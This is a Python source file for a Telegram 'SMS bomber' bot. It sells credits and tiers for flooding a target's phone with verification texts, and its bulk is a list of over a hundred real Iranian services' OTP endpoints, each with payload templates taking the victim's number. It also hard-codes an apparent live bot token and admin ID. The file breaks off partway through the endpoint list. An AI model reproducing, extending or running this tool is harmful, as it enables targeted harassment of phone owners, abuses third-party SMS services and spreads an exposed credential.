# bot.py - نسخه کامل با بیش از ۲۴۰ اندپوینت
import os
import asyncio
import logging
import json
import time
import random
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

import cloudscraper

# ============================================================
# تنظیمات
# ============================================================

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8586016384:AAFNSMHw-2TsJGZBcHKNOHrOzOa_HliZC9E")
ADMIN_IDS = [int(id) for id in os.getenv("ADMIN_IDS", "7351574618").split(",")]

# ============================================================
# ایجاد Bot و Dispatcher
# ============================================================

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ============================================================
# State ها
# ============================================================

class BombState(StatesGroup):
    waiting_for_phone = State()

class AdminState(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_user_id = State()
    waiting_for_credits = State()

# ============================================================
# دیتابیس (در حافظه)
# ============================================================

class Database:
    def __init__(self):
        self.users = {}
        self.payment_requests = []
        self.bomb_logs = []
    
    async def get_user(self, user_id: int):
        return self.users.get(user_id)
    
    async def create_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, referred_by: int = None):
        if user_id not in self.users:
            self.users[user_id] = {
                'user_id': user_id,
                'username': username,
                'first_name': first_name,
                'last_name': last_name,
                'tier': 'Free',
                'credits': 5,
                'referral_count': 0,
                'referral_code': self._generate_code(),
                'referred_by': referred_by,
                'last_bomb_time': None,
                'registered_at': datetime.now().isoformat(),
                'is_banned': False,
                'total_bombs': 0
            }
            if referred_by and referred_by in self.users:
                self.users[referred_by]['referral_count'] += 1
                if self.users[referred_by]['referral_count'] >= 3:
                    self.users[referred_by]['tier'] = 'VIP'
        return self.users[user_id]
    
    def _generate_code(self):
        import string
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    
    async def get_credits(self, user_id: int) -> int:
        user = await self.get_user(user_id)
        return user.get('credits', 0) if user else 0
    
    async def get_tier(self, user_id: int) -> str:
        user = await self.get_user(user_id)
        return user.get('tier', 'Free') if user else 'Free'
    
    async def spend_credit(self, user_id: int, amount: int = 1) -> bool:
        user = await self.get_user(user_id)
        if not user or user['credits'] < amount:
            return False
        user['credits'] -= amount
        user['total_bombs'] = user.get('total_bombs', 0) + 1
        user['last_bomb_time'] = datetime.now().isoformat()
        return True
    
    async def add_credits(self, user_id: int, amount: int, description: str = ""):
        user = await self.get_user(user_id)
        if user:
            user['credits'] += amount
    
    async def get_cooldown(self, user_id: int) -> int:
        tier = await self.get_tier(user_id)
        cooldowns = {'Free': 300, 'VIP': 180, 'Pro': 60}
        return cooldowns.get(tier, 300)
    
    async def check_cooldown(self, user_id: int):
        user = await self.get_user(user_id)
        if not user or not user.get('last_bomb_time'):
            return True, 0, "✅ آماده ارسال!"
        
        last = datetime.fromisoformat(user['last_bomb_time'])
        cooldown = await self.get_cooldown(user_id)
        elapsed = (datetime.now() - last).total_seconds()
        remaining = cooldown - elapsed
        
        if remaining > 0:
            return False, remaining, f"⏳ باید {int(remaining//60):02d}:{int(remaining%60):02d} صبر کنی!"
        return True, 0, "✅ آماده ارسال!"
    
    async def update_last_bomb_time(self, user_id: int):
        user = await self.get_user(user_id)
        if user:
            user['last_bomb_time'] = datetime.now().isoformat()
    
    async def log_bomb(self, user_id: int, target_phone: str, success: int, failed: int):
        self.bomb_logs.append({
            'user_id': user_id,
            'target_phone': target_phone,
            'success': success,
            'failed': failed,
            'created_at': datetime.now().isoformat()
        })
    
    async def get_stats(self, user_id: int):
        user = await self.get_user(user_id)
        logs = [l for l in self.bomb_logs if l['user_id'] == user_id]
        return {
            'tier': user.get('tier', 'Free') if user else 'Free',
            'credits': user.get('credits', 0) if user else 0,
            'total_bombs': user.get('total_bombs', 0) if user else 0,
            'referral_count': user.get('referral_count', 0) if user else 0,
            'logs_count': len(logs),
            'total_success': sum(l['success'] for l in logs),
            'total_failed': sum(l['failed'] for l in logs)
        }
    
    async def get_all_users(self):
        return self.users

db = Database()

# ============================================================
# لیست کامل اندپوینت‌ها (۲۴۷+ عدد)
# ============================================================

SITES = [
    {"name": "Snapp Drivers", "url": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json"},
    {"name": "Snapp Taxi", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json"},
    {"name": "Snapp V2", "url": "https://api.snapp.ir/api/v1/sms/link", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Tapsi", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "PASSENGER"}}, "type": "json"},
    {"name": "Tapsi API", "url": "https://api.tapsi.ir/api/v2.2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "{phone}", "role": "DRIVER"}, "otpOption": "SMS"}, "type": "json"},
    {"name": "AloPeyk", "url": "https://api.alopeyk.com/api/v2/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"type": "CUSTOMER", "phone": "0{phone}", "platform": "pwa"}, "type": "json"},
    {"name": "AloPeyk Safir", "url": "https://api.alopeyk.com/safir-service/api/v1/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Trip", "url": "https://gateway.trip.ir/api/registers", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"CellPhone": "0{phone}"}, "type": "json"},
    {"name": "Achareh", "url": "https://api.achareh.co/v2/accounts/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "98{phone}"}, "type": "json"},
    {"name": "Snapptrip", "url": "https://www.snapptrip.com/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}", "country_code": "+98", "lang": "fa"}, "type": "json"},
    {"name": "Snappfood", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
    {"name": "Snappmarket", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
    {"name": "Snappexpress", "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
    {"name": "Caropex", "url": "https://caropex.com/api/v1/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Zigap", "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "+98{phone}"}, "type": "json"},
    {"name": "Tap33", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "BIKER"}}, "type": "json"},
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Digikala", "url": "https://api.digikala.com/v1/user/authenticate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "otp_call": False}, "type": "json"},
    {"name": "Digikala V2", "url": "https://api.digikala.com/v1/user/forgot/check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "DigikalaJet", "url": "https://api.digikalajet.ir/user/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Digikalacall", "url": "https://api.digikala.com/v1/user/authenticate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"backUrl": "/", "username": "0{phone}", "otp_call": "true"}, "type": "json"},
    {"name": "Jabama", "url": "https://gw.jabama.com/api/v4/account/send-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Rojashop", "url": "https://rojashop.com/api/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Bikoplus", "url": "https://bikoplus.com/account/check-phone-number", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Torob", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Banimode", "url": "https://mobapi.banimode.com/api/v2/auth/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Basalam", "url": "https://auth.basalam.com/otp-request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Pinket", "url": "https://pinket.com/api/cu/v2/phone-verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Khanoumi", "url": "https://www.khanoumi.com/accounts/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "redirectUrl": ""}, "type": "json"},
    {"name": "Digistyle", "url": "https://www.digistyle.com/users/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"loginRegister[email_phone]": "0{phone}"}, "type": "json"},
    {"name": "Microele", "url": "https://www.microele.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "action": "register", "ajax": "1"}, "type": "json"},
    {"name": "Electrastore", "url": "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
    {"name": "Primashop", "url": "https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
    {"name": "Ubike", "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
    {"name": "Titomarket", "url": "https://titomarket.com/index.php?route=account/login_verify/verify", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"redirect": "https://titomarket.com/my-account", "telephone": "0{phone}"}, "type": "json"},
    {"name": "4hair", "url": "https://4hair.ir/user/login.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"num": "0{phone}", "ok": ""}, "type": "json"},
    {"name": "Igame", "url": "https://igame.ir/api/play/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Karlancer", "url": "https://www.karlancer.com/api/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}", "role": "freelancer"}, "type": "json"},
    {"name": "Hsaria", "url": "https://www.hsaria.com/MemberRegisterLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
    {"name": "Twsms", "url": "https://twsms.ir/client/register.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "agree": "agree", "sendsms": "1"}, "type": "json"},
    {"name": "Baradarantoy", "url": "https://baradarantoy.ir/send_confirm_sms_ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"user_tel": "0{phone}"}, "type": "json"},
    {"name": "Kavirmotor", "url": "https://kavirmotor.com/sms/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Chechilas", "url": "https://chechilas.com/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mob": "0{phone}"}, "type": "json"},
    {"name": "Searchii", "url": "https://searchii.ir/controler/phone_otp.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}", "action": "send_otp", "login": "user"}, "type": "json"},
    {"name": "Badparak", "url": "https://badparak.com/register/request_verification_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Hermeskala", "url": "https://hermeskala.com/login/send_vcode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}"}, "type": "json"},
    {"name": "Elinorboutique", "url": "https://api.elinorboutique.com/v1/customer/register-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Atlasmode", "url": "https://api.atlasmode.ir/v1/customer/register-login?version=new2", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Pooshakshoniz", "url": "https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Benedito", "url": "https://api.benedito.ir/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Rubeston", "url": "https://www.rubeston.com/api/customers/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "step": "1"}, "type": "json"},
    {"name": "Payagym", "url": "https://payagym.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "action": "kerasno_proform_register_inline_send"}, "type": "json"},
    {"name": "Martday", "url": "https://martday.ir/api/customer/member/register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"email": "0{phone}", "accept_term": "on"}, "type": "json"},
    {"name": "Paaakar", "url": "https://api.paaakar.com/v1/customer/register-login?version=new1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Atrinelec", "url": "https://www.atrinelec.com/ajax/SendSmsVerfiyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Ketabweb", "url": "https://ketabweb.com/login/?usernameCheck=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Hiss", "url": "https://hiss.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_email": "0{phone}", "action": "bakala_send_code"}, "type": "json"},
    {"name": "Tahrir-online", "url": "https://tahrir-online.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "+98{phone}", "form": "register", "action": "mobix_send_otp_code"}, "type": "json"},
    {"name": "Shikstyle", "url": "https://shik.style/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "login", "form=phone": "{phone}"}, "type": "json"},
    {"name": "Maxbax", "url": "https://maxbax.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "bakala_send_code", "phone_email": "0{phone}"}, "type": "json"},
    {"name": "Zzzagros", "url": "https://www.zzzagros.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "ywp_ajax_register", "ywp_register": "1", "ywp_reg_mobile": "0{phone}"}, "type": "json"},
    {"name": "Khodro45", "url": "https://khodro45.com/api/v1/customers/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Bama", "url": "https://bama.ir/signin-checkforcellnumber", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"cellNumber": "0{phone}"}, "type": "form"},
    {"name": "Balad", "url": "https://account.api.balad.ir/api/web/auth/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}", "os_type": "W"}, "type": "json"},
    {"name": "Hamrah-Mechanic", "url": "https://www.hamrah-mechanic.com/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}", "referrer": "https://www.google.com/"}, "type": "json"},
    {"name": "Hamrahsport", "url": "https://hamrahsport.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cell": "{phone}", "agree": "1", "send_otp": "1"}, "type": "json"},
    {"name": "Mrbilit", "url": "https://auth.mrbilit.com/api/login/exists/v2", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobileOrEmail": "0{phone}", "source": "2", "sendTokenIfNot": "true"}, "type": "json"},
    {"name": "Dastaneman", "url": "https://dastaneman.com/User/SendCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0098{phone}"}, "type": "json"},
    {"name": "Nikanbike", "url": "https://nikanbike.com/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"controller": "authentication", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "0{phone}", "SubmitCheck": ""}, "type": "json"},
    {"name": "Lendo", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Nobat", "url": "https://nobat.ir/api/public/patient/login/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
    {"name": "DrSaina", "url": "https://www.drsaina.com/RegisterLogin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"PhoneNumber": "0{phone}", "action": "checkIfUserExistOrNot", "noLayout": "False"}, "type": "form"},
    {"name": "Drnext", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"source": "besina", "mobile": "0{phone}"}, "type": "json"},
    {"name": "Doctoreto", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "country_id": 205}, "type": "json"},
    {"name": "Drdr", "url": "https://drdr.ir/api/v3/auth/login/mobile/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Pezeshket", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}"}, "type": "json"},
    {"name": "Mihanpezeshk", "url": "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"mobile": "0{phone}", "recaptcha": ""}, "type": "form"},
    {"name": "Limome", "url": "https://my.limoome.com/api/auth/login/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobileNumber": "{phone}", "country": "1"}, "type": "form"},
    {"name": "Bimito", "url": "https://bimito.com/api/core/app/user/checkLoginAvailability/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Azki", "url": "https://www.azki.com/api/core/v2/app/auth/register-verify-code", "method": "POST", "headers": {"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Accept-Language": "fa", "Origin": "https://www.azki.com", "Referer": "https://www.azki.com/", "device": "androidWeb", "deviceid": "7", "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36"}, "payload": {"phoneNumber": "{phone}", "origin": "www.azki.com"}, "type": "json"},
    {"name": "Drto", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "country_id": 205}, "type": "json"},
    {"name": "OKCS", "url": "https://okcs.com/users/mobilelogin", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "IToll", "url": "https://app.itoll.com/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
    {"name": "Bimebazar", "url": "https://bimebazar.com/accounts/api/login_sec/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Bitbarg", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Bitpin", "url": "https://api.bitpin.ir/v1/usr/sub_phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "captcha_token": ""}, "type": "json"},
    {"name": "Bit24", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "contry_code": "98"}, "type": "json"},
    {"name": "Okala", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}, "type": "json"},
    {"name": "Paymishe", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Pooleno", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Raybit", "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Anargift", "url": "https://api.anargift.com/api/people/auth", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"user": "0{phone}"}, "type": "json"},
    {"name": "Okorosh", "url": "https://my.okcs.com/api/check-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "g-recaptcha-response": ""}, "type": "json"},
    {"name": "Simkhan", "url": "https://www.simkhanapi.ir/api/users/registerV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}", "ReSendSMS": False}, "type": "json"},
    {"name": "Beroozmarket", "url": "https://api.beroozmart.com/api/pub/account/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "sendViaSms": True, "email": "null", "sendViaEmail": False}, "type": "json"},
    {"name": "Ickala", "url": "https://ickala.com/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"controller": "SendSMS", "module": "loginbymobile", "SubmitSmsSend": "1", "ajax": "true", "otp_mobile_num": "0{phone}"}, "type": "json"},
    {"name": "GapFilm", "url": "https://core.gapfilm.ir/api/v3.1/Account/Login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Type": "3", "Username": "0{phone}"}, "type": "json"},
    {"name": "Gap", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"mobile": "%2B98{phone}"}, "type": "json"},
    {"name": "Rubika", "url": "https://messengerg2c4.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "{phone}", "send_type": "SMS"}}, "type": "json"},
    {"name": "Bale", "url": "https://app.bale.ai/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Shad", "url": "https://shadmessenger12.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "098{phone}", "send_type": "SMS"}}, "type": "json"},
    {"name": "SibApp", "url": "https://api.sibapp.ir/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Telewebion", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"code": "98", "phone": "{phone}", "smsStatus": "default"}, "type": "json"},
    {"name": "Dalfak", "url": "https://www.dalfak.com/api/auth/sendVerificationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"type": 1, "value": "0{phone}"}, "type": "json"},
    {"name": "Filmnet", "url": "https://api-v2.filmnet.ir/access-token/users/{phone}/otp", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {}, "type": "json"},
    {"name": "Namava", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"UserName": "0{phone}"}, "type": "json"},
    {"name": "Chamedoon", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "origin": "/", "referrer_id": None}, "type": "json"},
    {"name": "Olgoo", "url": "https://www.olgoobooks.ir/sn/userRegistration/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"contactInfo[mobile]": "0{phone}", "contactInfo[agreementAccepted]": "1", "submit_register": "1"}, "type": "form"},
    {"name": "Pakhsh", "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Didnegar", "url": "https://www.didnegar.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "1", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Baskol", "url": "https://www.buskool.com/send_verification_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Kilid", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "See5", "url": "https://crm.see5.net/api_ajax/sendotp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}", "action": "sendsms"}, "type": "form"},
    {"name": "Ghabzino", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "method": "GET", "headers": {"Content-Type": "application/json"}, "payload": {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0{phone}"}}, "type": "json"},
    {"name": "Seebirani", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Binjo", "url": "https://api.binjo.ir/api/panel/get_code/{phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {}, "type": "json"},
    {"name": "Amoomilad", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c", "DeviceId": 1, "PhoneNumber": "0{phone}", "Helper": 77942}, "type": "json"},
    {"name": "Devsloop", "url": "https://i.devslop.app/app/ifollow/api/otp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"number": "0{phone}", "state": "number"}, "type": "form"},
